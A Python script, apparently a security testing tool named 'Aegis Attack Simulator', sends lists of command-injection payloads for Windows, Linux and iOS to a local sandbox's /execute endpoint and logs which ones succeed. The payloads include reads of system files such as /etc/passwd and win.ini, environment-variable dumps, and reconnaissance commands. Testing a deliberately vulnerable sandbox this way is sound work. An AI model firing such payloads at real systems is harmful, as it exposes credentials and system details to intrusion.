import sys
import json
import platform
import argparse
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import quote

import requests

TARGET = "http://localhost:8000"
LOG_FILE = Path(__file__).resolve().parents[1] / "data" / "logs" / "attack_results.json"

WINDOWS_PAYLOADS = [
    ("basic_echo", "echo AEGIS_BREACH_OK"),
    ("dir_listing", "dir src"),
    ("whoami", "whoami"),
    ("ipconfig", "ipconfig"),
    ("read_file", "type C:\\Windows\\win.ini"),
    ("chain_exec", "echo start && dir && echo end"),
    ("ping_test", "ping -n 1 127.0.0.1"),
    ("recursive_dir", "dir /s /b src\\sandbox_target"),
]

LINUX_PAYLOADS = [
    ("basic_echo", "echo AEGIS_BREACH_OK"),
    ("ls_listing", "ls -la src/"),
    ("whoami", "whoami"),
    ("ifconfig", "ifconfig 2>/dev/null || ip a"),
    ("read_file", "cat /etc/passwd 2>/dev/null || cat /etc/hostname"),
    ("chain_exec", "echo start && ls && echo end"),
    ("ping_test", "ping -c 1 127.0.0.1"),
    ("env_dump", "env 2>/dev/null || printenv"),
]

IOS_PAYLOADS = [
    ("basic_echo", "echo AEGIS_BREACH_OK"),
    ("uname", "uname -a"),
    ("ios_version", "sw_vers 2>/dev/null || sw_vers -productVersion 2>/dev/null"),
    ("disk_usage", "df -h /private/var"),
    ("plist_check", "plutil -lint /dev/null 2>&1"),
    ("sandbox_paths", "ls -la /var/mobile/Containers/Data/ 2>/dev/null"),
    ("network_probe", "ifconfig lo0 2>/dev/null || networksetup -listallnetworkservices 2>/dev/null"),
    ("sysctl_probe", "sysctl kern.version kern.ostype 2>/dev/null"),
]


def log_result(entry: dict):
    LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
    results = []
    if LOG_FILE.exists():
        results = json.loads(LOG_FILE.read_text())
    results.append(entry)
    LOG_FILE.write_text(json.dumps(results, indent=2))
    sys.stdout.write(f"  -> {entry['payload'][:50]}... "
                     f"{'EXPLOITABLE' if entry['exploitable'] else 'BLOCKED'}\n")


def classify_output(payload_name: str, output: str) -> bool:
    if not output.strip():
        return False
    indicators = ["AEGIS_BREACH_OK", "Volume in drive", "Directory of", "uid=", "gid=",
                  "Windows IP", "IPv4 Address", "127.0.0.1", "win.ini", "[fonts]",
                  "src\\sandbox_target", "src/sandbox_target", "admin", "user",
                  "Darwin", "kern.version", "ProductVersion", "/private/var", "Mobile"]
    return any(i in output for i in indicators)


PAYLOAD_MAP = {
    "windows": WINDOWS_PAYLOADS,
    "linux": LINUX_PAYLOADS,
    "ios": IOS_PAYLOADS,
}


def main():
    parser = argparse.ArgumentParser(description="Aegis Attack Simulator")
    parser.add_argument(
        "--target-os", "-os",
        choices=["auto", "windows", "linux", "ios"],
        default="auto",
        help="Target OS for payload selection (default: auto-detect)",
    )
    parser.add_argument(
        "--port", "-p",
        type=int,
        default=8000,
        help="Sandbox port (default: 8000)",
    )
    args = parser.parse_args()
    TARGET = f"http://localhost:{args.port}"

    if args.target_os == "auto":
        detected = platform.system().lower()
        target_os = detected if detected in PAYLOAD_MAP else "linux"
    else:
        target_os = args.target_os

    payloads = PAYLOAD_MAP[target_os]

    print(f"[*] Aegis Attack Simulator — Target: {TARGET}")
    print(f"[*] Target OS: {target_os} ({'auto-detect' if args.target_os == 'auto' else 'manual'})")

    try:
        requests.get(f"{TARGET}/ping", timeout=3)
    except requests.ConnectionError:
        print("[!] Sandbox not reachable. Start the server first:")
        print("    uvicorn src.sandbox_target.app:app --port 8000")
        sys.exit(1)

    print(f"[*] Firing {len(payloads)} payloads...\n")

    for name, payload in payloads:
        encoded = quote(payload)
        url = f"{TARGET}/execute?cmd={encoded}"
        try:
            resp = requests.get(url, timeout=10)
            data = resp.json()
            output = data.get("output", "")
            exploitable = classify_output(name, output)
            entry = {
                "timestamp": datetime.now(timezone.utc).isoformat().replace("+00:00", "Z"),
                "payload_name": name,
                "payload": payload,
                "output": output[:500],
                "status_code": resp.status_code,
                "exploitable": exploitable,
            }
            log_result(entry)
        except Exception as e:
            entry = {
                "timestamp": datetime.now(timezone.utc).isoformat().replace("+00:00", "Z"),
                "payload_name": name,
                "payload": payload,
                "output": f"[REQUEST FAILED] {e}",
                "status_code": 0,
                "exploitable": False,
            }
            log_result(entry)

    print(f"\n[*] Results written to {LOG_FILE}")
    exploitable_count = sum(
        1 for e in json.loads(LOG_FILE.read_text())
        if e.get("exploitable")
    )
    print(f"[*] {exploitable_count}/{len(payloads)} payloads confirmed exploitable")


if __name__ == "__main__":
    main()
